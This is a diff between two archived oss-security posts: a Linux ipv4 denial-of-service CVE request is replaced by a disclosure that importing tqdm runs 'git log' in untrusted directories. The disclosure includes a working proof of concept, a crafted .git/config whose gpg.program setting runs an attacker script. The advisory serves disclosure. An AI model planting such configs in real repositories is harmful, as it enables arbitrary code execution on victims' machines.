@@ -1,40 +1,53 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/03/15/3
-Message-ID: <56E80973.80606@virtuozzo.com>
-Date: Tue, 15 Mar 2016 16:09:07 +0300
-From: Vasily Averin <vvs@...tuozzo.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/12/25/2
+Message-ID: <20161225204743.vflt7rkcu55bqqgt@jwilk.net>
+Date: Sun, 25 Dec 2016 21:47:43 +0100
+From: Jakub Wilk <jwilk@...lk.net>
 To: oss-security@...ts.openwall.com
-Cc: Solar Designer <solar@...nwall.com>, Cyrill Gorcunov <gorcunov@...tuozzo.com>, "David S. Miller" <davem@...emloft.net>, Konstantin Khorenko <khorenko@...tuozzo.com>
-Subject: CVE request: ipv4: Don't do expensive useless work during inetdev destroy
+Subject: tqdm: insecure use of git
 Content-Type: text/plain; charset=utf-8
 
-Destroy of network interface with huge number of ipv4 addresses
-keeps rtnl_lock for a very long time (up to hour).
-It blocks many network related operations,
-including for example creation of new incoming ssh connections.
+tqdm <https://github.com/tqdm/tqdm> is a "fast, extensible progress bar for 
+Python".
 
-The problem is especially important for containers,
-container owner have enough permission to enable this trigger
-and then can block network access on whole host node.
+When you import tqdm, the tqdm._version module executes the following command:
 
-The problem is fixed in net-next git by patch fbd40ea0180a2d328c5adc61414dc8bab9335ce2
-(http://git.kernel.org/cgit/linux/kernel/git/davem/net-next.git/patch/?id=fbd40ea0180a2d328c5adc61414dc8bab9335ce2)
+    git log -n 1 --oneline
 
-From: David Miller <davem@...emloft.net>
-ipv4: Don't do expensive useless work during inetdev destroy.
+This was meant to check if the user is running a pre-release version of tqdm.
+But cwd might be a part of an unrelated git repository, possibly a malicious 
+one. At least with git 2.10 or later, it's possible to craft a repo in which 
+"git log" executes arbitrary code:
 
-When an inetdev is destroyed, every address assigned to the interface
-is removed.  And in this scenerio we do two pointless things which can
-be very expensive if the number of assigned interfaces is large:
+    $ tail -n4 /tmp/.git/config
+    [log]
+            showSignature = true
+    [gpg]
+            program = /tmp/moogpg
 
-1) Address promotion.  We are deleting all addresses, so there is no
-   point in doing this.
+    $ tail -n4 /tmp/moogpg
+    #!/bin/sh
+    exec > /dev/tty 2>&1
+    cowsay pwned
+    sleep 9999
 
-2) A full nf conntrack table purge for every address.  We only need to
-   do this once, as is already caught by the existing
-   masq_dev_notifier so masq_inet_event() can skip this.
+    $ cd /tmp
 
-Reported-by: Solar Designer <solar@...nwall.com>
-Signed-off-by: David S. Miller <davem@...emloft.net>
-Tested-by: Cyrill Gorcunov <gorcunov@...nvz.org>
+    $ pydoc tqdm
+     _______
+    < pwned >
+     -------
+            \   ^__^
+             \  (oo)\_______
+                (__)\       )\/\
+                    ||----w |
+                    ||     ||
 
+
+Upstream bug report:
+https://github.com/tqdm/tqdm/issues/328
+
+Affected versions: v4.4.1 and later.
+
+-- 
+Jakub Wilk
